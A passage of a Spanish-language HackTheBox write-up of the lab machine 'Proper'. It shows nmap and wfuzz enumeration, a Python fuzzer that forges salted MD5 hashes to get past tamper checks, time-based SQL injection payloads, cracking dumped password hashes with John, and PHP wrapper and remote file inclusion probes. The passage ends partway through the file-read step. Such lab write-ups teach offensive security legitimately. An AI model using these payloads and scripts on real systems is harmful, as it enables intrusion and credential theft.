---
layout      : post 
title       : "HackTheBox - Proper" 
author      : lanz 
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321banner.png 
category    : [ htb ]
tags        : [ SQLi, RFI, race-condition, RCE, reversing ]
---
Máquina Windows nivel difícil. Agregamos sal a nuestra inyección **SQL**, jugaremos a ganar la **race condition** y finalmente entre reversing, movimiento lateral, creación de scripts en **PowerShell** y **pipes** conseguiremos leer archivos del sistema (:

![321properHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321properHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [xct](https://www.hackthebox.eu/profile/13569) & [jkr](https://www.hackthebox.eu/profile/77141).

Manualidades, manual, manos.

Encontraremos únicamente un servidor web en esta máquina, tendremos que jugar mucho (mucho) y leer mucho (acá también :P), me divertí **bastante** escribiendo este writeup, perdón lo largo (:

Empezaremos jugando con una URL que tiene dos parámetros, en la que encontraremos un `SQL injection` en uno de ellos... Pero para jugar correctamente con él, debemos usar un `salt` (que encontramos causando errores en las consultas web) para darle el formato correcto a las peticiones, esto para evitar un errorsito. 

Encontraremos credenciales válidas contra un apartado del servidor web llamado `/licenses`. Jugando con él y unos `themes` que nos presenta el sitio web, vamos a encontrar un `Remote File Inclusion`, nos aprovecharemos de esa vuln para mediante un `race condition` sobreescribir el contenido de un `theme` por código `PHP` 🤭. Con esto en mente lograremos una sesión en la máquina como el usuario `web`. 

Estando dentro encontraremos un directorio llamativo (ya que no es nativo del sistema) en la ruta `C:\Program Files\Cleaner`, que contiene dos binarios, `server.exe` y `client.exe`, jugando (muuuuuuuucho) con ellos veremos un proceso que borra y restaura archivos del sistema, lo curioso es que en la mitad del proceso genera una copia del archivo borrado y lo encripta, usaremos ese archivo para seguir jugando y finalmente restaurarlo... 

Suena fácil (pensarlo también) pero jmm, varias cositas para jugar... Con esto podremos ver el contenido de cualquier objeto del sistema.

Pero hasta ahora no sé (y a los que he preguntado) como obtener una Shell en la máquina como el usuario **Administrator**, así que por ahora solo podemos leer archivos del sistema.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Bastaaaaante juego de nuestras manitas y muuuuy realista :)

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Que las luces fluyan.

1. [Reconocimiento](#reconocimiento).
  * [Descubrimos puertos abiertos con **nmap**](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Investigamos el servidor web sobre el puerto 80](#puerto-80).
3. [Explotación: jugamos con los parámetros de la web](#explotacion).
  * [Entendiendo como viajan las peticiones para evitar el error al modificar alguna variable](#web-avoid-tampering).
  * [Encontramos **inyección SQL time-based** jugando con la web](#web-sqli-time).
  * [Validamos credenciales encontradas con la **inyección SQL** contra un panel login](#licenses-web-part).
  * [Estudiamos posible **Remote File Inclusion** en la web](#web-rfi).
  * [Confirmando **Remote File Inclusion** en apartado web](#testing-securefunc).
  * [Intentamos **Race Condition** para sobreescribir archivo con código **PHP**](#web-racecondition).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Hacemos análisis dinámico contra los binarios del proceso **Cleanup**](#cleanup-analysis).
  * [Interactuamos con el **pipe** que usa el servicio **Cleanup**](#cleanup-pipe).
  * [Usando **IO Ninja** para ver procesos del **pipe** (gracias **4st1nus**)](#cleanup-ioninja).
  * [Viendo el contenido de cualquier archivo del sistema](#cleanup-readfiles).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Inicialmente haremos un escaneo de puertos para saber que servicios están ejecutándose:

```bash
❭ nmap -p- --open -v 10.10.10.231 -oG initScan 
```

| Parámetro  | Descripción |
| ---------- | :---------- |
| -p-        | Escanea todos los 65535.                      |
| --open     | Solo los puertos que están abiertos.          |
| -v         | Permite ver en consola lo que va encontrando. |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard. |

Obtenemos:

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.231
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.231 ()   Status: Up
Host: 10.10.10.231 ()   Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 225.78 seconds
```

Wow, curiosamente solo tenemos el puerto 80 abierto...

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web. |

Hagamos el escaneo basado en script y versiones, en este caso en el puerto 80 simplemente:

```bash
❭ nmap -p 80 -sC -sV 10.10.10.231 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.231
Nmap scan report for 10.10.10.231
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: OS Tidy Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.45 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 10.0 |

Empecemos a escarbar el servicio...

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

![321page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80.png)

Encontramos una bienvenida de varias imágenes y algo de data, pero nada interesante.

Revisando el código fuente, tenemos una referencia a una URL y una petición:

```js
...
<script type="text/javascript">
    $(document).ready(function(){
        'use strict';
        jQuery('#headerwrap').backstretch([ "assets/img/bg/bg1.jpg", "assets/img/bg/bg3.jpg" ], {duration: 8000, fade: 500});
        $( "#product-content" ).load("/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b",function() {});
    });
</script>
...
```

Lo emplea para armar un apartado de la bienvenida: (tiene un aspecto a que podemos jugar con inyecciones, pero primero veamos lo que renderiza con la URL)

![321page80_products](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_products.png)

Interceptando la petición con `Burp` e intentando modificar alguno de los parámetros, tenemos:

(*Agregue `proper.htb` al `/etc/hosts` para que resuelva contra la IP, por si alguno se pierde al ver el dominio ahí*.)

**Original:**

![321burp_productsPHP_original](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_original.png)

**Modificada:**

![321burp_productsPHP_modErr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_productsPHP_modErr.png)

Jmmm, nos detecta que hemos intentado modificar la petición y nos salta una advertencia. Salta siempre el mismo error si intentamos modificar cualquier variable...

Siento que por acá deben ser los tiros pero por el momento no sé que intentar... Hagamos un escaneo de rutas a ver si encontramos algo:

```bash
❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.10.231/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================
000000084:   301        1 L      10 W       150 Ch      "assets" 
000000765:   301        1 L      10 W       150 Ch      "Assets"
000004182:   301        1 L      10 W       152 Ch      "licenses"
```

Si validamos las rutas en la web, obtenemos info en `/licenses`:

![321page80_licenses](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses.png)

Un panel login, debemos logearnos con una dirección de correo (que podemos intuir que sea `usuario@proper.htb`). Pero probando cositas no logramos nada... 

Haciendo un fuzz sobre `/assets` encontramos la ruta `/api`, pero no tenemos acceso a su contenido:

```bash
❭ wfuzz --hc=404,500 -L -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://10.10.10.231/assets/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000009:   403        29 L     92 W       1233 Ch     "js"
000000015:   403        29 L     92 W       1233 Ch     "css"
000000045:   403        29 L     92 W       1233 Ch     "img"
000000078:   403        29 L     92 W       1233 Ch     "api"
```

...

# Explotación [#](#explotacion) {#explotacion}

Jmmm, tenemos un login panel y un archivo que hace consultas para extraer productos... Podemos pensar que debemos hacer algún tipo de `SQ, pero primero debemos bypassear el `WAF (Firewall Web)` que nos detecta si cambiamos la consulta, después de un rato jugando con `BurpSuite` vemos un error interesante al quitar uno de los parámetros:

![321burp_products_without_h_parm](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321burp_products_without_h_parm.png)

* Vemos la ruta donde están servidos los archivos del sitio: `C:\inetpub\wwwroot\`.
* Tenemos un `salt` (**conjunto de bits aleatorios que se le agregan a un hash, sea al principio o al final**, no lo sabemos) [**INFO Salt**](https://thalskarthmaelstrom.wordpress.com/2014/03/15/hash-salt-y-hashes-lentos/).
* Vemos dos archivos que pueden ser interesantes en algún caso, por si encontramos algún **LFI** ya sabemos como se llama el archivo de configuración de la base de datos...

Después de muchas pruebas ):) y estar super perdido, jugamos con el **salt** y un fuzzeito guapetón de payloads, pero antes de jugar, veamos el formato necesario para evitar el error **"Forbidden - Tampering attempt detected"** al modificar las variables:

---

## Evitando error <u>Tampering attempt detected</u> [📌](#web-avoid-tampering) {#web-avoid-tampering}

Esta es la petición original:

```html
http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b
```

Vamos a entender como esta generándose el hash y revisamos como viaja la data.

* [How to hash passwords in Python](https://nitratine.net/blog/post/how-to-hash-passwords-in-python/).
* [Hashing passwords in Python](https://www.vitoshacademy.com/hashing-passwords-in-python/).

---

```bash
❭ python3 
>>> import requests
>>> import hashlib
>>> 
>>> url = "http://proper.htb/products-ajax.php"
>>> salt = "hie0shah6ooNoim"
# En la consulta sale con un "+", pero es debido al URL encode que se hace en la peticion (el + es un espacio ahí)
>>> payload = "id desc" 
```

Bien, tenemos las variables necesarias para empezar a jugar, el valor de `h` podemos intuir que es el resultado del payload pero obteniendo su hash en `md5`:

```py
>>> hashh = hashlib.md5(payload.encode('utf-8')).hexdigest()
>>> print("Payload: " + payload + " --> " + "Hash: " + hashh)
Payload: id desc --> Hash: aa5a97b10a6dd87160868d2316ab2425
```

Listo, obtenemos el hash **md5** de la cadena `id desc`, pero no es el mismo que el de la consulta original, por lo tanto si hacemos una validación ante la web, vemos el error:

```bash
>>> session = requests.Session()
>>> r = session.get(url, params={"order":payload, "h":hashh})
>>> print(r.text)
Forbidden - Tampering attempt detected.
```

Acá entra en juego la variable `salt`, movámosla por todos lados a ver en que momento (si es que llega ese momento) nos deja de mostrar el error en la respuesta:

🕴️ Después de un rato...

```bash
>>> hashh = hashlib.md5(payload.encode('utf-8') + salt.encode('utf-8')).hexdigest()
>>> print("Payload + Salt: " + payload + " + " + salt + " --> " + "Hash: " + hashh)
Payload + Salt: id desc + hie0shah6ooNoim --> Hash: 453d803378d6fb7eaf6a3cab618106d6
>>> r = session.get(url, params={"order":payload, "h":hashh})
>>> print(r.text)
Forbidden - Tampering attempt detected.
```

```bash
>>> hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()
>>> print("Salt + Payload: " + salt + " + " + payload + " --> " + "Hash: " + hashh)
Salt + Payload: hie0shah6ooNoim + id desc --> Hash: a1b30d31d344a5a4e41e8496ccbdd26b
>>> r = session.get(url, params={"order":payload, "h":hashh})
>>> print(r.text)
<div class="row"><div class="col-md-4">
...
```

OJOOOOOOOOOOOOOo, **en el hash vemos el mismo valor que en la consulta original** y al ver la respuesta de la petición tenemos la cabecera `HTML` de la web (: Así que ya sabemos como se genera el hash y como viaja la data para no obtener el errooooooooooooooooooooor 🌻

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_gif_yeahminion.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

## Encontramos <u>SQLi time-based</u> en la web [📌](#web-sqli-time) {#web-sqli-time}

Creemos el script para leer de un archivo llamado `sqlIgeneric.txt` algunos payloads (de [esta lista](https://github.com/payloadbox/sql-injection-payload-list)), enviarlos a la web y ver que pasa :P

```py
#!/usr/bin/python3

import requests, hashlib
import signal
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables
url = "http://proper.htb/products-ajax.php"
salt = "hie0shah6ooNoim"
file_sqli = open('./sqlIgeneric.txt', 'r')
sqli_payloads = []

p1 = log.progress("paYl0Ad")

for pos, line_sqli in enumerate(file_sqli): # Recorremos el archivo
    payload = line_sqli.strip()
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    p1.status(payload)
    data_get = {"order":payload, "h":hashh}

    # Si se demora 3 segundos respondiendonos potencialmente existe una inyección sql basada en tiempo.
    try:
        r = requests.get(url, params=data_get, timeout=3)

        # O si no hay error en la web tambien puede ser interesante.
        if r.status_code != 500: 
            sqli_payloads.append(payload)

    except requests.exceptions.Timeout:
        sqli_payloads.append(payload)

p1.success("FINAAAAAAAAAAAAAAAAAL.")

if sqli_payloads:
    print("[+] Estos payloads generaron algo distinto en la respuesta de la web.")
    total_payloads = '\n'.join(sqli_payloads) # Tomamos cada valor del array y lo imprimimos en una nueva linea.
    print(total_payloads)
else:
    print("[-] Nada aún...")

file_sqli.close()
```

Validamos si la página nos devuelve un código distinto a **Internal Error** (500) y si algún payload (de los que están basados en tiempo) hace que la petición se demore.

El diccionario es una colección de varios repos, logramos extraer más de 2000 payloads (líneas):

* [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list).
* [https://github.com/OWASP/payloads-sql-blind](https://github.com/OWASP/AppSec-Browser-Bundle/tree/master/utilities/wfuzz/wordlist/fuzzdb/attack-payloads/sql-injection/payloads-sql-blind).

Ejecutándolo vemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_fuzzSQLi_payloadsFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAA, hay varios payloads que en su interacción generaron algo distinto a lo normal. PEEEEEEEEEEEERO ¿qué es lo llamativo? ¿lo sabes ya? EXACTOOOOOOO!! Todas tienen que ver con una inyección **SQL** basada en tiempooooooooooooooo.

🧿 ***Una inyección SQL basada en tiempo básicamente es ejecutar alguna sentencia que al dar resultado (exitoso) genera un -delay- en el lado del servidor. Si ese -delay- existe (causado por nosotros) sabemos que existe un `SQLi time-based`.***

Para confirmar que tenemos ese tipo de inyección podemos hacer esto:

```py
...
for i in range(1,11):
    payload = f"IF(6={i},sleep(5),0)#"
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    data_get = {"order":payload, "h":hashh}

    try:
        r = requests.get(url, params=data_get, timeout=3)
        print("Nada: " + payload)
    except requests.exceptions.Timeout:
        print("-------> Acá: " + payload)
```

Le pasamos el payload `IF(6=N,sleep(5),0)#` (este es válido en `MySQL`, en caso de no servir deberíamos probar lo mismo pero con la sintaxis de los otros gestores de DBs) que le indica: 

* Si `N` numero es igual a `6`, haz que la web ***se demore 5 segundos en responder***, de lo contrario sigue... Si existe el delay en la respuesta, confirmamos la inyección.

Y si lo probamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_confirmSQli_TIMEBASED.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

LIIIIIIIIIIIISTOOOOOOOOONES, tenemos `SQLi time-based` (y sabemos que estamos ante un `MySQL`).

Pues explotémoslo y veamos toooooooooda la info de las bases de datos (:

...

### Extraemos las bases de datos existentes [🪓](#web-sqli-dbs) {#web-sqli-dbs}

> [dbs.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/dbs.py)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ejecutándolo vemos solo 3 bases de datos y dos llamativas, `cleaner` y `test`, veamos las tablas de `cleaner`...

### Extraemos las tablas de la base de datos <u>cleaner</u> [🪓](#web-sqli-tables) {#web-sqli-tables}

> [tables.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/tables.py)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_tables_cleaner.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, también hay varias tablas, veamos la de los clientes primero...

### Extraemos las columnas de la tabla <u>customers</u> [🪓](#web-sqli-columns) {#web-sqli-columns}

> [columns.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/columns.py)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_columns_cleanerYcustomers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora intentemos dumpear los campos principales, el `id`, el usuario (`login`) y su `password`.

### Extraemos información de las columnas [🪓](#web-sqli-info) {#web-sqli-info}

> [info.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/proper/sqli/info.py)

Con el script podemos indicarle varios campos, por ejemplo `id` y `login` separados por comas (`,`), y nos devolvería el resultado de cada uno pero separado por `-`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_login.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, hay varios usuarios (no dumpeo todo porque nos echamos acá la vida entera :P, pero los hay) y tenemos unos correos... Caemos en cuenta del recurso que encontramos antes en nuestra enumeración, `/licenses`, nos mostraba un panel login que pedía exactamente eso, un mail.

Pero claro, nos falta la contraseña, pues extraigamos las dos primeras a ver si podemos hacer algo con ellas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_scriptPY_sqli_info_cleanerYcustomersYid_passwordMD5.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si nos fijamos la contraseña siempre tiene el formato de ser un hash `MD5`:

⛷️ ***La codificación del MD5 de 128 bits es representada típicamente como un número de 32 símbolos hexadecimales.*** [Wikipedia](https://es.wikipedia.org/wiki/MD5)

> **Toma de la `a` a la `f`, de la `A` a la `F` y del `0` al `9`**.

Por lo que para agilizar la extracción podemos pasarle únicamente símbolos hexadecimales como diccionario:

```py
...
dic = string.hexdigits + "-£"
...
```

Y volvemos a ejecutar...

Mientras el script corre podemos jugar con los dos hashes de antes, probablemente sean crackeables, intentémoslo.

Los guardamos en un archivo junto a su usuario (o no, como quieran):

```bash
❱ cat hashes 
vikki.solomon@throwaway.mail:7c6a180b36896a0a8c02787eeafb0e4c
nstone@trashbin.mail:6cb75f652a9b52798eb6cf2201057c73
```

Ahora usamos `John The Ripper` y el diccionario `rockyou.txt` para intentar crackearlas:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
```

Y en menos de un segundo vemos esto:

```bash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (vikki.solomon@throwaway.mail)
password2        (nstone@trashbin.mail)
2g 0:00:00:00 DONE (2021-03-18 25:25) 11.76g/s 6776p/s 6776c/s 9035C/s football1..summer1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Existen similitudes con los hashes para los dos usuarios (: YYYYYYYYYYYYY tenemos dos contraseñas para probar en el login panel.

---

## Validamos credenciales en el login de <u>/licenses</u> [📌](#licenses-web-part) {#licenses-web-part}

Listo, ahora que tenemos credenciales podemos probar ante el login panel en `/licenses` y ver si conseguimos entrar, probemos con el primer usuario: 

* `vikki.solomon@throwaway.mail` -> `password1`

![321page80_licenses_loginDone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321page80_licenses_loginDone.png)

VAMONOOOOOOOOOOOOOOOOOOOOOOOOOOOS, tenemos acceso al login panel.

Vemos los productos del usuario, así que suponemos que cada usuario puede tener más o menos productos (de los productos que vimos al inicio).

> Ya podemos dejar de descubrir hashes con nuestro script :P

También en el header tenemos 3 links que hacen que nuestro "theme" o estilo de la web cambie...

Dando vueltas buscando vulnerabilidades con alguno de los "themes" y volviendo a leer algunos otros a ver si era que se me había pasado alguno en el que fuera necesario estar autenticado para poder ser explotado no encontré nada útil... 

Después de un rato pensé en hacer un script que actuara como fuzzer a ver si encontrábamos otros "themes", para que tomara cada directorio o archivo y lo concatenara con la `salt` y hacer el mismo proceso de antes, enviar el payload con su respectivo `hash`. 

Pero en su ejecución final terminamos encontrando algo mejor:

```py
#!/usr/bin/python3

import requests
import hashlib
import signal

# Ctrl + C
def def_handler(sig, frame):
    print("\nCancelado por el usuario, saliendo...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Proceso login y fuzz
url = "http://proper.htb/licenses"

def fuzzing(session):
    salt = "hie0shah6ooNoim"

    with open('/opt/SecLists/Discovery/Web-Content/raft-small-directories.txt', 'r') as wordlist:
        for line in wordlist:
            # Quitamos espacios finales de la cadena
            payload = line.rstrip("\n")
            # Generamos hash: md5(salt+payload)
            hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

            cookie = session.cookies.get_dict()
            parameters = "?theme=" + payload + "&h=" + hashh

            r = session.get(url + "/licenses.php" + parameters, cookies=cookie)

            print("\n[+] \"Theme\": %s -> %s" % (payload, parameters))
            print(r.text)

def login():
    session = requests.Session()

    data_post = {
        "username" : "vikki.solomon@throwaway.mail",
        "password" : "password1"
    }

    r = session.post(url + "/index.php", data=data_post)
    fuzzing(session)

if __name__ == '__main__':
    login()
```

**(QUE JESO ↑)**

Lo que estamos haciendo es sencillo, resumidamente por si te perdiste:

* Primero iniciamos sesión para poder hacer peticiones a la ruta `/licenses.php` con la sesión de `vikki`.
* Tomamos cada línea del wordlist y lo concatenamos con la `salt` (como antes).
* Y simplemente hacemos la petición, donde los parámetros son: `theme=<linea>` y `h=<hash>`.

Así que por ejemplo, llega la línea `hola`:

```py
>>> import hashlib
>>> salt = "hie0shah6ooNoim"
>>> payload = "hola"
>>> hash = hashlib.md5(salt.encode() + payload.encode()).hexdigest()
>>> print("MD5(%s + %s) = Hash: %s" % (salt, payload, hash))
MD5(hie0shah6ooNoim + hola) = Hash: 5557007e63c9d95d45ca15a39ff4a5d6
>>> 
```

Entonces finalmente la consulta que haría seria:

```php
?theme=hola&h=5557007e63c9d95d45ca15a39ff4a5d6
```

**(FIN...)**

Entonces al ejecutarlo, vemos esto con cualquier petición que hace:

![321bash_licensesPY_error_foundPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321bash_licensesPY_error_foundPHP.png)

Opa, el principal error es que intenta llamar un archivo, pero no lo encuentra (en el caso de la imagen intenta abrir el "theme" **intranet** en la ruta `intranet/header.inc`).

---

## Estudiamos posible <u>Remote File Inclusion</u> en la web [📌](#web-rfi) {#web-rfi}

Ahora, revisando detalladamente el error nos damos cuenta del uso de la función:

```php
 31 | // Following function securely includes a file. Whenever we
 32 | // will encounter a PHP tag we will just bail out here.
```

Aseguran la inclusión de un archivo, donde si se encuentra un tag de **PHP** (`<?`) en el contenido del mismo, simplemente muestra error y no hace el include:

```py
 33 | function secure_include($file) {
 34 |   if (strpos(file_get_contents($file),'<?') === false) {     <<<<< Error encountered in this line.
 35 |     include($file);
 36 |   } else {
 37 |     http_response_code(403);
 38 |     die('Forbidden - Tampering attempt detected.');
 39 |   }
 40 | }
 ```

> [strpos](https://www.php.net/manual/es/function.strpos.php) encuentra la **posición** de la primera ocurrencia (cuando encuentra X cadena) en X contenido...

> `$a` === `$b` / Idéntico / `true` si `$a` es igual a `$b`, y la variable es del **mismo tipo**.
>> [Operadores de comparación en **PHP**](https://www.php.net/manual/es/language.operators.comparison.php).

¿Se entiende lo que hace la función y el uso de `strpos`? Simulemos esto para que quede más claro:

* [Editor **PHP** online](https://paiza.io/es/projects/new).

---

```php
<?php

// Digamos que este es el contenido del archivo, un simple hola en codigo PHP.
$contenido_archivo = "<?php echo 'Hola'; ?>";

// Validamos que en el contenido este la cadena  <?, si esta, la validacion se vuelve  true  y nos muestra el error.
if (strpos($contenido_archivo, '<?') === false) {
    echo "Contenido: ".$contenido_archivo."\n";
    echo "Tamos bien";
}
else {
    echo "Contenido: ".$contenido_archivo."\n";
    echo "Error, tag detectado :P";
}

?>
```

Ejecutamos:

```php
Contenido: <?php echo 'Hola'; ?>
Error, tag detectado :P
```

Y si cambiamos el orden del `<?` igual seguimos teniendo el error :P 

```php
Contenido: php echo 'Hola'; <?php echo ''; ?>
Error, tag detectado :P
```

Si le quitamos el **tag** y ejecutamos:

```php
Contenido: php echo 'ahora no hay tag inicial'; ?>
Tamos bien
```

Listo, sabienod que hace y como funciona el `strpos` podemos seguir...

...

Sabemos que en este caso el error que nos muestra es por que no encuentra el archivo para cargar el "theme", pero ahora sabemos tambien que valida su contenido en busca de algun tag **PHP**...

***Por si no quieres ver todos los fallos que hice te dejo dos opciones:***

🤍 [Test con el posible **RFI**, testeando y dando algunas explicaciones de más yyyy más testeo](#testing-securefunc).<br>
❤️ [Jugando con el **RFI** logramos interceptar un hash **NTLMv2**](#found-ntlmv2).

---

## Testaaando y confirmando <u>Remote File Inclusion</u> [📌](#testing-securefunc) {#testing-securefunc}

Jugando con esto se me ocurrió levantar un servidor web e intentar cargar un archivo X como "theme", modificando el script quedaría así:

```py
...
def fuzzing(session):
    salt = "hie0shah6ooNoim"
    payload = "http://10.10.14.178:8000/locuras"

    # Generamos hash: md5(salt+payload)
    hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

    cookie = session.cookies.get_dict()
    parameters = "?theme=" + payload + "&h=" + hashh

    r = session.get(url + "/licenses.php" + parameters, cookies=cookie)

    print("\n[+] \"Theme\": %s -> %s" % (payload, parameters))
    print(r.text)
...
```

Levantamos el servidor:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y ejecutamos, vemos que intenta cargar el "theme":

```bash
[+] "Theme": http://10.10.14.178:8000/locuras -> ?theme=http://10.10.14.178:8000/locuras&h=63b61941e36339f3b23fc614b16a3124
<!-- [2] file_get_contents(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: HTTP request failed! HTTP/1.0 404 File not found
...
<!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
...
<!-- [2] include(http://10.10.14.178:8000/locuras/header.inc): failed to open stream: no suitable wrapper could be found
...
```

Y en nuestro servidor:

```bash
10.10.10.231 - - [25/Mar/2021 25:25:25] code 404, message File not found
10.10.10.231 - - [25/Mar/2021 25:25:25] "GET /locuras/header.inc HTTP/1.0" 404 -
```

😮 vemos en los errores de **PHP** que no esta habilitado el incluir archivos mediante una **URL**, pero obtenemos la petición en nuestro servidor de **Python**, probemos a ver que podemos lograr con esto...

* Siempre hará la petición buscando un archivo `header.inc`.
* Esto lo hace concatenando el directorio (payload que le podemos pasar) con `/header.inc`.

[.inc files](https://stackoverflow.com/questions/7129842/what-is-an-inc-and-why-use-it):

![321google_incFiles](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321google_incFiles.png)

Jugando un rato -logramos- extraer los archivos `header.inc` de cada *theme*, esto usando [wrappers](https://www.php.net/manual/en/wrappers.php) (antes vimos que el **wrapper** `http` estaba deshabilitado), por ejemplo usando el **wrapper** `php://` para que junto a un filtro convierta el contenido de un archivo a `base64` (esto es importante para archivos `PHP`, ya que son interpretados y no podríamos ver su contenido si los llamamos así como así e.e) para posteriormente copiar la cadena, decodearla y guardar su resultado en un archivo. 

Así veríamos el contenido del archivo, hagámoslo para el `header.inc` del *theme* `solar`:

* [**PHP** wrappers - Cheat Sheet](https://ironhackers.es/herramientas/lfi-cheat-sheet/).

(***Agregué el tomar el payload desde la terminal, que pereza estar entrando a cambiarlo a mano :P***)

```bash
❭ python3 licenses.py "php://filter/convert.base64-encode/resource=solar"

[+] "Theme": php://filter/convert.base64-encode/resource=solar -> ?theme=php://filter/convert.base64-encode/resource=solar&h=da608eae83164e4c3ff7d60869eeed12

